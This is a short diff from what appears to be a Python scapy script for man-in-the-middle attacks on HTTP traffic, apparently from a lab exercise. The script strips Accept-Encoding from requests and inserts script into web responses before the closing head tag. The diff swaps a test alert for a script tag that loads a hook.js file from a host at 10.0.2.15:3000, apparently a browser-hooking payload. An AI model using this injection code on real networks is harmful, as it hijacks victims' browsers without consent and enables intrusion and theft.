@@ -29,7 +29,7 @@ def process_packet(packet):
                 load = re.sub("Accept-Encoding:.*?\\r\\n","", load)
             elif scapy_packet[scapy.TCP].sport == 80:
                 print("[+] Response")
-                injection_code = "<script>alert('test');</script>"
+                injection_code = '<script src="http://10.0.2.15:3000/hook.js"></script>'
                 load = load.replace("</head>", injection_code + "</head>")
                 # The new load make it content-length bigger so we need to change it
                 content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
